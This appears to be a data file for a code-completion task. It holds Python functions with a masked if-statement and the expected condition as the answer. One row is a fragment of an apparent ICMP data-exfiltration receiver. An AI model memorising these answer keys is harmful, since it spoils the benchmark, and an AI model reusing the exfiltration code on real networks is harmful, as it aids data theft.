1465,"def test_float_overflow(self):<tab>import sys<tab>big_int = int(sys.float_info.max) * 2<tab>for t in float_types + [c_longdouble]:<tab><tab>self.assertRaises(OverflowError, t, big_int)<tab><tab>if hasattr(t, ""__ctype_be__""):<tab><tab><tab>self.assertRaises(OverflowError, t.__ctype_be__, big_int)<tab><tab><IF-STMT><tab><tab><tab>self.assertRaises(OverflowError, t.__ctype_le__, big_int)","if hasattr ( t , ""__ctype_le__"" ) :",131
1466,"def _process_folder(config, folder, cache, output):<tab>if not os.path.isdir(folder):<tab><tab>raise ConanException(""No such directory: '%s'"" % str(folder))<tab>if config.source_folder:<tab><tab>folder = os.path.join(folder, config.source_folder)<tab>for root, dirs, files in walk(folder):<tab><tab>dirs[:] = [d for d in dirs if d != "".git""]<tab><tab><IF-STMT><tab><tab><tab>continue<tab><tab>for f in files:<tab><tab><tab>_process_file(root, f, config, cache, output, folder)","if "".git"" in root :",150
1467,"def setChanged(self, c, changed):<tab># Find the tab corresponding to c.<tab>dw = c.frame.top  # A DynamicWindow<tab>i = self.indexOf(dw)<tab>if i < 0:<tab><tab>return<tab>s = self.tabText(i)<tab>s = g.u(s)<tab>if len(s) > 2:<tab><tab><IF-STMT><tab><tab><tab>if not s.startswith(""* ""):<tab><tab><tab><tab>title = ""* "" + s<tab><tab><tab><tab>self.setTabText(i, title)<tab><tab>else:<tab><tab><tab>if s.startswith(""* ""):<tab><tab><tab><tab>title = s[2:]<tab><tab><tab><tab>self.setTabText(i, title)",if changed :,172
1468,"def dump_metrics(self):<tab>metrics = self._registry.dump_metrics()<tab># Filter out min and max if there have been no samples.<tab>for metric in metrics.itervalues():<tab><tab>if metric.get(""count"") == 0:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>metric[""min""] = 0.0<tab><tab><tab>if ""max"" in metric:<tab><tab><tab><tab>metric[""max""] = 0.0<tab>return metrics","if ""min"" in metric :",109
1469,"def ref_max_pooling_3d(x, kernel, stride, ignore_border, pad):<tab>y = []<tab>for xx in x.reshape((-1,) + x.shape[-4:]):<tab><tab><IF-STMT><tab><tab><tab>xx = xx[np.newaxis]<tab><tab>y += [<tab><tab><tab>refs.pooling_3d(xx, ""max"", kernel, stride, pad, ignore_border)[np.newaxis]<tab><tab>]<tab>y = np.vstack(y)<tab>if x.ndim == 3:<tab><tab>y = np.squeeze(y, 1)<tab>return y.reshape(x.shape[:-4] + y.shape[1:])",if xx . ndim == 3 :,160
1470,def reader_():<tab>with open(file_list) as flist:<tab><tab>lines = [line.strip() for line in flist]<tab><tab><IF-STMT><tab><tab><tab>random.shuffle(lines)<tab><tab>for line in lines:<tab><tab><tab>file_path = line.strip()<tab><tab><tab>yield [file_path],if shuffle :,79
1471,"def _sql_like_to_regex(pattern, escape):<tab>cur_i = 0<tab>pattern_length = len(pattern)<tab>while cur_i < pattern_length:<tab><tab>nxt_i = cur_i + 1<tab><tab>cur = pattern[cur_i]<tab><tab>nxt = pattern[nxt_i] if nxt_i < pattern_length else None<tab><tab>skip = 1<tab><tab>if nxt is not None and escape is not None and cur == escape:<tab><tab><tab>yield nxt<tab><tab><tab>skip = 2<tab><tab>elif cur == ""%"":<tab><tab><tab>yield "".*""<tab><tab><IF-STMT><tab><tab><tab>yield "".""<tab><tab>else:<tab><tab><tab>yield cur<tab><tab>cur_i += skip","elif cur == ""_"" :",169
1472,"def gaussian(N=1000, draw=True, show=True, seed=42, color=None, marker=""sphere""):<tab>""""""Show N random gaussian distributed points using a scatter plot.""""""<tab>import ipyvolume as ipv<tab>rng = np.random.RandomState(seed)  # pylint: disable=no-member<tab>x, y, z = rng.normal(size=(3, N))<tab>if draw:<tab><tab><IF-STMT><tab><tab><tab>mesh = ipv.scatter(x, y, z, marker=marker, color=color)<tab><tab>else:<tab><tab><tab>mesh = ipv.scatter(x, y, z, marker=marker)<tab><tab>if show:<tab><tab><tab># ipv.squarelim()<tab><tab><tab>ipv.show()<tab><tab>return mesh<tab>else:<tab><tab>return x, y, z",if color :,191
1473,"def _delete_keys(bucket, keys):<tab>for name in keys:<tab><tab>while True:<tab><tab><tab>try:<tab><tab><tab><tab>k = boto.s3.connection.Key(bucket, name)<tab><tab><tab><tab>bucket.delete_key(k)<tab><tab><tab>except boto.exception.S3ResponseError as e:<tab><tab><tab><tab><IF-STMT><tab><tab><tab><tab><tab># Key is already not present.  Continue the<tab><tab><tab><tab><tab># deletion iteration.<tab><tab><tab><tab><tab>break<tab><tab><tab><tab>raise<tab><tab><tab>else:<tab><tab><tab><tab>break",if e . status == 404 :,141
1474,"def detect(self):<tab>hardware = self.middleware.call_sync(""failover.hardware"")<tab>if hardware == ""ECHOSTREAM"":<tab><tab>proc = subprocess.check_output(<tab><tab><tab>'/usr/sbin/pciconf -lv | grep ""card=0xa01f8086 chip=0x10d38086""',<tab><tab><tab>shell=True,<tab><tab><tab>encoding=""utf8"",<tab><tab>)<tab><tab><IF-STMT><tab><tab><tab>return [proc.split(""@"")[0]]<tab>if hardware in (""ECHOWARP"", ""PUMA""):<tab><tab>return [""ntb0""]<tab>if hardware == ""BHYVE"":<tab><tab>return [""vtnet1""]<tab>if hardware == ""SBB"":<tab><tab>return [""ix0""]<tab>if hardware == ""ULTIMATE"":<tab><tab>return [""igb1""]<tab>return []",if proc :,199
1475,"def check_config(param):<tab>fileopen = open(""/etc/setoolkit/set.config"", ""r"")<tab>for line in fileopen:<tab><tab>line = line.rstrip()<tab><tab># print line<tab><tab># if the line starts with the param we want then we are set, otherwise<tab><tab># if it starts with a # then ignore<tab><tab>if line.startswith(param) != ""#"":<tab><tab><tab><IF-STMT><tab><tab><tab><tab>line = line.rstrip()<tab><tab><tab><tab># remove any quotes or single quotes<tab><tab><tab><tab>line = line.replace('""', """")<tab><tab><tab><tab>line = line.replace(""'"", """")<tab><tab><tab><tab>line = line.split(""="", 1)<tab><tab><tab><tab>return line[1]",if line . startswith ( param ) :,176
1476,"def put(self, s):<tab>""""""Put string s to self.outputFile. All output eventually comes here.""""""<tab># Improved code: self.outputFile (a cStringIO object) always exists.<tab>if s:<tab><tab>self.putCount += 1<tab><tab><IF-STMT><tab><tab><tab>s = g.toEncodedString(s, self.leo_file_encoding, reportErrors=True)<tab><tab>self.outputFile.write(s)",if not g . isPython3 :,110
1477,"def get_system_prop_font(self):<tab>""""""Look up the system font""""""<tab>if self.system_prop_font is not None:<tab><tab>return self.system_prop_font<tab>elif ""org.gnome.desktop.interface"" not in Gio.Settings.list_schemas():<tab><tab>return<tab>else:<tab><tab>gsettings = Gio.Settings.new(""org.gnome.desktop.interface"")<tab><tab>value = gsettings.get_value(""font-name"")<tab><tab><IF-STMT><tab><tab><tab>self.system_prop_font = value.get_string()<tab><tab>else:<tab><tab><tab>self.system_prop_font = ""Sans 10""<tab><tab>return self.system_prop_font",if value :,170
1478,"def _setoct(self, octstring):<tab>""""""Reset the bitstring to have the value given in octstring.""""""<tab>octstring = tidy_input_string(octstring)<tab># remove any 0o if present<tab>octstring = octstring.replace(""0o"", """")<tab>binlist = []<tab>for i in octstring:<tab><tab>try:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>raise ValueError<tab><tab><tab>binlist.append(OCT_TO_BITS[int(i)])<tab><tab>except ValueError:<tab><tab><tab>raise CreationError(""Invalid symbol '{0}' in oct initialiser."", i)<tab>self._setbin_unsafe("""".join(binlist))",if not 0 <= int ( i ) < 8 :,166
1479,"def group(self, resources):<tab>groups = {}<tab>for r in resources:<tab><tab>v = self._value_to_sort(self.group_by, r)<tab><tab>vstr = str(v)<tab><tab><IF-STMT><tab><tab><tab>groups[vstr] = {""sortkey"": v, ""resources"": []}<tab><tab>groups[vstr][""resources""].append(r)<tab>return groups",if vstr not in groups :,98
1480,"def rd(line_number, row, col, key, default=None):<tab>""""""Return Row data by column name""""""<tab>if key in col:<tab><tab>if col[key] >= len(row):<tab><tab><tab>LOG.warning(""missing '%s, on line %d"" % (key, line_number))<tab><tab><tab>return default<tab><tab>retval = row[col[key]].strip()<tab><tab><IF-STMT><tab><tab><tab>return default<tab><tab>else:<tab><tab><tab>return retval<tab>else:<tab><tab>return default","if retval == """" :",125
1481,"def _run(self):<tab>while True:<tab><tab>tup = self._pop()<tab><tab><IF-STMT><tab><tab><tab>return<tab><tab>method_name, kwargs, msg = tup<tab><tab>try:<tab><tab><tab>super(SerializedInvoker, self).invoke(method_name, kwargs, msg)<tab><tab>except mitogen.core.CallError:<tab><tab><tab>e = sys.exc_info()[1]<tab><tab><tab>LOG.warning(""%r: call error: %s: %s"", self, msg, e)<tab><tab><tab>msg.reply(e)<tab><tab>except Exception:<tab><tab><tab>LOG.exception(""%r: while invoking %s()"", self, method_name)<tab><tab><tab>msg.reply(mitogen.core.Message.dead())",if tup is None :,179
1482,"def raises(except_cls, message=None):<tab>try:<tab><tab>yield<tab><tab>success = False<tab>except except_cls as e:<tab><tab><IF-STMT><tab><tab><tab>assert re.search(message, compat.text_type(e), re.UNICODE), ""%r !~ %s"" % (<tab><tab><tab><tab>message,<tab><tab><tab><tab>e,<tab><tab><tab>)<tab><tab><tab>print(compat.text_type(e).encode(""utf-8""))<tab><tab>success = True<tab># assert outside the block so it works for AssertionError too !<tab>assert success, ""Callable did not raise an exception""",if message :,145
1483,"def buttonClicked(self, button):<tab>role = self.buttonBox.buttonRole(button)<tab>if role == QDialogButtonBox.ResetRole:<tab><tab>current_tab = self.tabwidget.currentWidget()<tab><tab>section_to_update = Sections.ALL<tab><tab>if current_tab is self.page_general:<tab><tab><tab>section_to_update = Sections.GENERAL<tab><tab><IF-STMT><tab><tab><tab>section_to_update = Sections.DISPLAY<tab><tab>self.resetToDefaults(section_to_update)",if current_tab is self . page_display :,137
1484,"def make_range_list(*values):<tab>ranges = []<tab>for v in values:<tab><tab><IF-STMT><tab><tab><tab>val_node = plural.value_node(v)<tab><tab><tab>ranges.append((val_node, val_node))<tab><tab>else:<tab><tab><tab>assert isinstance(v, tuple)<tab><tab><tab>ranges.append((plural.value_node(v[0]), plural.value_node(v[1])))<tab>return plural.range_list_node(ranges)","if isinstance ( v , int ) :",121
1485,"def __in_comment(self):<tab>if self.highlighter:<tab><tab>current_color = self.__get_current_color()<tab><tab>comment_color = self.highlighter.get_color_name(""comment"")<tab><tab><IF-STMT><tab><tab><tab>return True<tab><tab>else:<tab><tab><tab>return False<tab>else:<tab><tab>return False",if current_color == comment_color :,90
1486,"def __str__(self):<tab>""""""Constructs to variable list output used in cron jobs""""""<tab>ret = []<tab>for key, value in self.items():<tab><tab>if self.previous:<tab><tab><tab>if self.previous.all().get(key, None) == value:<tab><tab><tab><tab>continue<tab><tab><IF-STMT><tab><tab><tab>value = '""%s""' % value<tab><tab>ret.append(""%s=%s"" % (key, unicode(value)))<tab>ret.append("""")<tab>return ""\n"".join(ret)","if "" "" in unicode ( value ) or value == """" :",132
1487,"def _on_config_changed(changed_name: str) -> None:<tab>""""""Call config_changed hooks if the config changed.""""""<tab>for mod_info in _module_infos:<tab><tab>if mod_info.skip_hooks:<tab><tab><tab>continue<tab><tab>for option, hook in mod_info.config_changed_hooks:<tab><tab><tab>if option is None:<tab><tab><tab><tab>hook()<tab><tab><tab>else:<tab><tab><tab><tab>cfilter = config.change_filter(option)<tab><tab><tab><tab>cfilter.validate()<tab><tab><tab><tab><IF-STMT><tab><tab><tab><tab><tab>hook()",if cfilter . check_match ( changed_name ) :,151
1488,"def __init__(self, transcripts, vocab=None, unknown=None, *args, **kwargs):<tab>""""""Creates a new raw transcript source.""""""<tab>super().__init__(*args, **kwargs)<tab>self.transcripts = transcripts<tab>self.indices = numpy.arange(len(self))<tab>self.vocab = self.make_vocab(vocab)<tab>if unknown is None:<tab><tab>self.unknown = self.unknown_index = None<tab>else:<tab><tab>self.unknown_index = self.vocab.get(unknown)<tab><tab><IF-STMT><tab><tab><tab>raise ValueError(<tab><tab><tab><tab>'The ""unknown"" vocabulary word must be '<tab><tab><tab><tab>""part of the vocabulary itself.""<tab><tab><tab>)<tab><tab>self.unknown = unknown",if self . unknown_index is None :,182
1489,"def load_info(cls, path, reset_paths=False, load_model_if_required=True):<tab>load_path = path + cls.trainer_info_name<tab>try:<tab><tab>return load_pkl.load(path=load_path)<tab>except:<tab><tab><IF-STMT><tab><tab><tab>trainer = cls.load(path=path, reset_paths=reset_paths)<tab><tab><tab>return trainer.get_info()<tab><tab>else:<tab><tab><tab>raise",if load_model_if_required :,120
1490,"def createActions(actions, target):<tab># actions = [(name, shortcut, icon, desc, func)]<tab>for name, shortcut, icon, desc, func in actions:<tab><tab>action = QAction(target)<tab><tab><IF-STMT><tab><tab><tab>action.setIcon(icon)<tab><tab>if shortcut:<tab><tab><tab>action.setShortcut(shortcut)<tab><tab>action.setText(desc)<tab><tab>action.triggered.connect(func)<tab><tab>setattr(target, name, action)",if icon :,114
1491,"def load_user_logins(self, key, dates, timestamps, size_threshold=None):<tab>date_bucket = {}<tab>for user_data in self.fetch_user_table():<tab><tab><IF-STMT><tab><tab><tab>continue<tab><tab># note: ts should already be utc!<tab><tab>dt = datetime.fromtimestamp(user_data[6] / 1000)<tab><tab>dt = dt.date().isoformat()<tab><tab>date_bucket[dt] = date_bucket.get(dt, 0) + 1<tab>datapoints = []<tab>for dt, ts in zip(dates, timestamps):<tab><tab>count = date_bucket.get(dt, 0)<tab><tab>datapoints.append((count, ts))<tab>return {""target"": key, ""datapoints"": datapoints}",if size_threshold is not None and user_data [ 1 ] < size_threshold :,194
1492,def apply_batch(it):<tab>batch = []<tab>for item in it:<tab><tab><IF-STMT><tab><tab><tab>yield item<tab><tab>else:<tab><tab><tab>batch.append(item)<tab><tab><tab>if len(batch) >= n:<tab><tab><tab><tab>yield batch<tab><tab><tab><tab>batch = []<tab>if batch:<tab><tab>yield batch,"if isinstance ( item , _NextValueNotReady ) :",92
1493,"def convert_tomlkit_table(section):<tab>if isinstance(section, tomlkit.items.Table):<tab><tab>body = section.value._body<tab>else:<tab><tab>body = section._body<tab>for key, value in body:<tab><tab>if not key:<tab><tab><tab>continue<tab><tab><IF-STMT><tab><tab><tab>table = tomlkit.inline_table()<tab><tab><tab>table.update(value.value)<tab><tab><tab>section[key.key] = table","if hasattr ( value , ""keys"" ) and not isinstance ( value , tomlkit . items . InlineTable ) :",134
1494,"def _do_ssl_handshake(self):<tab>try:<tab><tab>self.socket.do_handshake()<tab>except ssl.SSLError as err:<tab><tab>if err.args[0] in (ssl.SSL_ERROR_WANT_READ, ssl.SSL_ERROR_WANT_WRITE):<tab><tab><tab>return<tab><tab><IF-STMT><tab><tab><tab>return self.handle_close()<tab><tab>raise<tab>except OSError as err:<tab><tab>if err.args[0] == errno.ECONNABORTED:<tab><tab><tab>return self.handle_close()<tab>else:<tab><tab>self._ssl_accepting = False",elif err . args [ 0 ] == ssl . SSL_ERROR_EOF :,161
1495,"def get_filechanges(repo, revision, parents, mleft):<tab>""""""Given some repository and revision, find all changed/deleted files.""""""<tab>l, c, r = [], [], []<tab>for p in parents:<tab><tab><IF-STMT><tab><tab><tab>continue<tab><tab>mright = revsymbol(repo, b""%d"" % p).manifest()<tab><tab>l, c, r = split_dict(mleft, mright, l, c, r)<tab>l.sort()<tab>c.sort()<tab>r.sort()<tab>return l, c, r",if p < 0 :,134
1496,"def close_share(self, share_name):<tab>c = await run(<tab><tab>[SMBCmd.SMBCONTROL.value, ""smbd"", ""close-share"", share_name], check=False<tab>)<tab>if c.returncode != 0:<tab><tab><IF-STMT><tab><tab><tab># smbd is not running. Don't log error message.<tab><tab><tab>return<tab><tab>self.logger.warn(<tab><tab><tab>""Failed to close smb share [%s]: [%s]"",<tab><tab><tab>share_name,<tab><tab><tab>c.stderr.decode().strip(),<tab><tab>)","if ""Can't find pid"" in c . stderr . decode ( ) :",152
1497,"def execute(self, context):<tab>if self.tree_name:<tab><tab>ng = bpy.data.node_groups.get(self.tree_name)<tab><tab><IF-STMT><tab><tab><tab>apply_theme(ng)<tab><tab>else:<tab><tab><tab>return {""CANCELLED""}<tab>else:<tab><tab>apply_theme()<tab>return {""FINISHED""}",if ng :,86
1498,"def apply(self, db, object):<tab>if not self.source_handle:<tab><tab><IF-STMT><tab><tab><tab># check whether the citation list is empty as a proxy for<tab><tab><tab># there being no sources<tab><tab><tab>return len(object.get_all_citation_lists()) == 0<tab><tab>else:<tab><tab><tab>return False<tab>else:<tab><tab>for citation_handle in object.get_all_citation_lists():<tab><tab><tab>citation = db.get_citation_from_handle(citation_handle)<tab><tab><tab>if citation.get_reference_handle() == self.source_handle:<tab><tab><tab><tab>return True<tab><tab>return False",if self . nosource :,164
1499,"def get_data_dir():<tab>""""""Get the directory path for flit user data files.""""""<tab>home = os.path.realpath(os.path.expanduser(""~""))<tab>if sys.platform == ""darwin"":<tab><tab>d = Path(home, ""Library"")<tab>elif os.name == ""nt"":<tab><tab>appdata = os.environ.get(""APPDATA"", None)<tab><tab><IF-STMT><tab><tab><tab>d = Path(appdata)<tab><tab>else:<tab><tab><tab>d = Path(home, ""AppData"", ""Roaming"")<tab>else:<tab><tab># Linux, non-OS X Unix, AIX, etc.<tab><tab>xdg = os.environ.get(""XDG_DATA_HOME"", None)<tab><tab>d = Path(xdg) if xdg else Path(home, "".local/share"")<tab>return d / ""flit""",if appdata :,195
1500,"def wait_for_service(name, timeout=200):<tab>start = time.time()<tab>while True:<tab><tab>status = win32serviceutil.QueryServiceStatus(name)<tab><tab>if status[1] == win32service.SERVICE_STOPPED:<tab><tab><tab>break<tab><tab><IF-STMT><tab><tab><tab>raise TimeoutError(<tab><tab><tab><tab>""Timeout waiting for service""<tab><tab><tab>)  # pylint: disable=undefined-variable<tab><tab>time.sleep(0.3)",if time . time ( ) - start > timeout :,121
1501,"def get_selection(self):<tab>if self.uistate[""selection""] == ""all"":<tab><tab>return AllPages(self.notebook)<tab>else:<tab><tab>path = self.uistate[""selected_page""]<tab><tab><IF-STMT><tab><tab><tab>return SubPages(self.notebook, path)<tab><tab>else:<tab><tab><tab>return SinglePage(self.notebook, path)","if self . uistate [ ""selection_recursive"" ] :",100
1502,"def test_repeated_edges(self):<tab>graph_size = 20<tab>for _ in range(20):<tab><tab>graph = Graph.graph(graph_size, int(graph_size * 2), repeated_edges=True)<tab><tab>edges = [(e.start, e.end) for e in graph.iterate_edges()]<tab><tab>has_repeated_edges = len(edges) > len(set(edges))<tab><tab><IF-STMT><tab><tab><tab>break<tab>self.assertTrue(has_repeated_edges)<tab>for _ in range(10):<tab><tab>graph = Graph.graph(graph_size, int(graph_size * 2), repeated_edges=False)<tab><tab>edges = list(graph.iterate_edges())<tab><tab>self.assertEqual(len(edges), len(set(edges)))",if has_repeated_edges :,189
1503,"def cs(self):<tab>""""""ConfigSpace representation of this search space.""""""<tab>cs = CS.ConfigurationSpace()<tab>for k, v in self.kwvars.items():<tab><tab><IF-STMT><tab><tab><tab>_add_cs(cs, v.cs, k)<tab><tab>elif isinstance(v, Space):<tab><tab><tab>hp = v.get_hp(name=k)<tab><tab><tab>_add_hp(cs, hp)<tab><tab>else:<tab><tab><tab>_rm_hp(cs, k)<tab>return cs","if isinstance ( v , NestedSpace ) :",129
1504,"def packet_handler(Packet):<tab>global add_new_line<tab>if Packet.haslayer(ICMP):<tab><tab>Data = Packet.getlayer(ICMP).getlayer(Raw)<tab><tab>exfiltrated_data = Data.load[int(exfiltration_length) :].replace(<tab><tab><tab>exfiltration_length * ""\n"", ""\n""<tab><tab>)<tab><tab><IF-STMT><tab><tab><tab>add_new_line = False<tab><tab>sys.stdout.write(exfiltrated_data)<tab><tab>sys.stdout.flush()","if exfiltrated_data . endswith ( ""\n"" ) :",145
1505,"def acquire(self, *, wait=False):<tab>if not wait and self.value <= 0:<tab><tab># signal that we're not acquiring<tab><tab>return False<tab>while self.value <= 0:<tab><tab>future = self.loop.create_future()<tab><tab>self._waiters.append(future)<tab><tab>try:<tab><tab><tab>await future<tab><tab>except:<tab><tab><tab>future.cancel()<tab><tab><tab><IF-STMT><tab><tab><tab><tab>self.wake_up()<tab><tab><tab>raise<tab>self.value -= 1<tab>return True",if self . value > 0 and not future . cancelled ( ) :,142
1506,"def handle_events(self, events):<tab>for event in events:<tab><tab><IF-STMT><tab><tab><tab>self.recording ^= True<tab><tab><tab>if not self.recording:<tab><tab><tab><tab>self.save()<tab><tab><tab>else:<tab><tab><tab><tab>logger.info(""ScreenRecorder started"")<tab><tab><tab>break<tab>return events",if event == WindowEvent . SCREEN_RECORDING_TOGGLE :,92
1507,"def _register_for_operations(config, session, service_name):<tab># There's certainly a tradeoff for registering the retry config<tab># for the operations when the service is created.  In practice,<tab># there aren't a whole lot of per operation retry configs so<tab># this is ok for now.<tab>for key in config:<tab><tab><IF-STMT><tab><tab><tab>continue<tab><tab>handler = retryhandler.create_retry_handler(config, key)<tab><tab>unique_id = ""retry-config-%s-%s"" % (service_name, key)<tab><tab>session.register(<tab><tab><tab>""needs-retry.%s.%s"" % (service_name, key), handler, unique_id=unique_id<tab><tab>)","if key == ""__default__"" :",176
1508,"def showTicks(self, show=True):<tab>for tick in self.ticks.keys():<tab><tab>if show:<tab><tab><tab>tick.show()<tab><tab><tab>orig = getattr(self, ""_allowAdd_backup"", None)<tab><tab><tab><IF-STMT><tab><tab><tab><tab>self.allowAdd = orig<tab><tab>else:<tab><tab><tab>self._allowAdd_backup = self.allowAdd<tab><tab><tab>self.allowAdd = False  # block tick creation<tab><tab><tab>tick.hide()",if orig :,116
1509,"def _has_cycle(self, node, visited, visit_stack):<tab>self.last_visited_node = node<tab>self.path.append(node)<tab>visited[node] = True<tab>visit_stack[node] = True<tab>for neighbor in self.graph[node]:<tab><tab>if not visited[neighbor]:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>return True<tab><tab>elif visit_stack[neighbor]:<tab><tab><tab>self.path.append(neighbor)<tab><tab><tab>return True<tab>self.path.remove(node)<tab>visit_stack[node] = False<tab>return False","if self . _has_cycle ( neighbor , visited , visit_stack ) :",154
1510,"def get_project_list(exclude_default=False):<tab>""""""get_project_list - get list of all projects""""""<tab>projects_path = __project__.get_projects_path()<tab>project_list = []<tab>if os.path.exists(projects_path):<tab><tab>for project in os.listdir(projects_path):<tab><tab><tab>project_path = os.path.join(projects_path, project)<tab><tab><tab><IF-STMT><tab><tab><tab><tab>project_list.append(project)<tab>if exclude_default:<tab><tab>pass<tab>else:<tab><tab>project_list.append(""default"")<tab>return sorted(project_list)",if os . path . isdir ( project_path ) :,161
1511,"def split(self, chunksize):<tab>modulus_map = {<tab><tab>4: 256,<tab><tab>5: 10,<tab><tab>8: 100,<tab>}<tab>chunks, ip = self.preprocess(chunksize)<tab>ret = """"<tab>for i in range(len(chunks)):<tab><tab>ip_part = compat_str(ip[i] % modulus_map[chunksize]) if i < 4 else """"<tab><tab><IF-STMT><tab><tab><tab>ret += ip_part + chunks[i]<tab><tab>else:<tab><tab><tab>ret += chunks[i] + ip_part<tab>self.target = ret",if chunksize == 8 :,143
1512,"def DepsToModules(deps, prefix, suffix):<tab>modules = []<tab>for filepath in deps:<tab><tab>filename = os.path.basename(filepath)<tab><tab><IF-STMT><tab><tab><tab>modules.append(filename[len(prefix) : -len(suffix)])<tab>return modules",if filename . startswith ( prefix ) and filename . endswith ( suffix ) :,79
1513,"def listdir(path):<tab>path = path.rstrip(""/"") + ""/""<tab>dir_set, file_set = set(), set()<tab>for p in files.keys():<tab><tab><IF-STMT><tab><tab><tab>continue<tab><tab>parts = p[len(path) :].split(""/"")<tab><tab>if len(parts) == 1:<tab><tab><tab>file_set.add(parts[0])<tab><tab>else:<tab><tab><tab>dir_set.add(parts[0])<tab>return sorted(dir_set), sorted(file_set)",if not p . startswith ( path ) :,128
1514,"def read_series(rec):<tab>found = []<tab>for tag in (""440"", ""490"", ""830""):<tab><tab>fields = rec.get_fields(tag)<tab><tab><IF-STMT><tab><tab><tab>continue<tab><tab>for f in fields:<tab><tab><tab>this = []<tab><tab><tab>for k, v in f.get_subfields([""a"", ""v""]):<tab><tab><tab><tab>if k == ""v"" and v:<tab><tab><tab><tab><tab>this.append(v)<tab><tab><tab><tab><tab>continue<tab><tab><tab><tab>v = v.rstrip("".,; "")<tab><tab><tab><tab>if v:<tab><tab><tab><tab><tab>this.append(v)<tab><tab><tab>if this:<tab><tab><tab><tab>found += ["" -- "".join(this)]<tab>return found",if not fields :,182
1515,"def find_nameless_urls(self, conf):<tab>nameless = []<tab>patterns = self.get_patterns(conf)<tab>for u in patterns:<tab><tab><IF-STMT><tab><tab><tab>nameless.extend(self.find_nameless_urls(u))<tab><tab>else:<tab><tab><tab>if u.name is None:<tab><tab><tab><tab>nameless.append(u)<tab>return nameless",if self . has_patterns ( u ) :,103
1516,"def update_billing_status(self, update_modified=True):<tab>updated_pr = [self.name]<tab>for d in self.get(""items""):<tab><tab><IF-STMT><tab><tab><tab>updated_pr += update_billed_amount_based_on_po(<tab><tab><tab><tab>d.purchase_order_item, update_modified<tab><tab><tab>)<tab>for pr in set(updated_pr):<tab><tab>pr_doc = self if (pr == self.name) else frappe.get_doc(""Purchase Receipt"", pr)<tab><tab>update_billing_percentage(pr_doc, update_modified=update_modified)<tab>self.load_from_db()",if d . purchase_order_item :,166
1517,"def _get_version():<tab>with open(""haiku/__init__.py"") as fp:<tab><tab>for line in fp:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>g = {}<tab><tab><tab><tab>exec(line, g)  # pylint: disable=exec-used<tab><tab><tab><tab>return g[""__version__""]<tab><tab>raise ValueError(""`__version__` not defined in `haiku/__init__.py`"")","if line . startswith ( ""__version__"" ) :",101
1518,"def GetSelected(self):<tab>if self.GetStyleL(""style"") & self.Style.LBS_MULTIPLESEL:<tab><tab>result = self.SendMessage(self.Hwnd, self.Msg.LB_GETSELCOUNT, 0, 0)<tab><tab>if result:<tab><tab><tab>return self.SendMessage(self.Hwnd, self.Msg.LB_GETANCHORINDEX, 0, 0)<tab>else:<tab><tab>result = self.SendMessage(self.Hwnd, self.Msg.LB_GETCURSEL, 0, 0)<tab><tab><IF-STMT><tab><tab><tab>return result",if result != LB_ERR :,151
1519,"def __init__(self, column_names, column_types, **kwargs):<tab>super().__init__(**kwargs)<tab>self.column_names = column_names<tab>self.column_types = column_types<tab>encoding = []<tab>for column_name in self.column_names:<tab><tab>column_type = self.column_types[column_name]<tab><tab><IF-STMT><tab><tab><tab># TODO: Search to use one-hot or int.<tab><tab><tab>encoding.append(keras_layers.INT)<tab><tab>else:<tab><tab><tab>encoding.append(keras_layers.NONE)<tab>self.layer = keras_layers.MultiCategoryEncoding(encoding)",if column_type == analysers . CATEGORICAL :,162
1520,"def rotate(cls, axis, theta):<tab>""""""Prepare a quaternion that represents a rotation on a given axis.""""""<tab>if isinstance(axis, str):<tab><tab><IF-STMT><tab><tab><tab>axis = V.X<tab><tab>elif axis in (""y"", ""Y""):<tab><tab><tab>axis = V.Y<tab><tab>elif axis in (""z"", ""Z""):<tab><tab><tab>axis = V.Z<tab>axis = axis.normalize()<tab>s = math.sin(theta / 2.0)<tab>c = math.cos(theta / 2.0)<tab>return Q(axis._v[0] * s, axis._v[1] * s, axis._v[2] * s, c)","if axis in ( ""x"" , ""X"" ) :",169
1521,"def log(self, request):<tab>web_socket = WebSocketResponse()<tab>await web_socket.prepare(request)<tab>self.app[""websockets""].add(web_socket)<tab>try:<tab><tab>async for msg in web_socket:<tab><tab><tab>if msg.type == WSMsgType.TEXT:<tab><tab><tab><tab><IF-STMT><tab><tab><tab><tab><tab>await web_socket.close()<tab><tab><tab>elif msg.type == WSMsgType.ERROR:<tab><tab><tab><tab>print(<tab><tab><tab><tab><tab>""web socket connection closed with exception %s""<tab><tab><tab><tab><tab>% web_socket.exception()<tab><tab><tab><tab>)<tab>finally:<tab><tab>self.app[""websockets""].remove(web_socket)<tab>return web_socket","if msg . data == ""close"" :",187
1522,"def test_loc_is_stochastic_parameter(self):<tab>param = iap.Laplace(iap.Choice([-100, 100]), 1)<tab>seen = [0, 0]<tab>for _ in sm.xrange(1000):<tab><tab>samples = param.draw_samples((100,))<tab><tab>exp = np.mean(samples)<tab><tab><IF-STMT><tab><tab><tab>seen[0] += 1<tab><tab>elif 100 - 10 < exp < 100 + 10:<tab><tab><tab>seen[1] += 1<tab><tab>else:<tab><tab><tab>assert False<tab>assert 500 - 100 < seen[0] < 500 + 100<tab>assert 500 - 100 < seen[1] < 500 + 100",if - 100 - 10 < exp < - 100 + 10 :,167
1523,"def cli_setup(args=None):<tab>""""""future api for setup env by cli""""""<tab>if not args:<tab><tab><IF-STMT><tab><tab><tab>print(""no cmdline args"")<tab><tab><tab>return False<tab><tab>args = sys.argv<tab>print(args)<tab>ap = argparse.ArgumentParser()<tab>if ""--report"" in args:<tab><tab>from airtest.report.report import main as report_main<tab><tab>ap = report_parser(ap)<tab><tab>args = ap.parse_args(args)<tab><tab>report_main(args)<tab><tab>exit(0)<tab>else:<tab><tab>ap = runner_parser(ap)<tab><tab>args = ap.parse_args(args)<tab><tab>setup_by_args(args)<tab>return True",if len ( sys . argv ) < 2 :,187
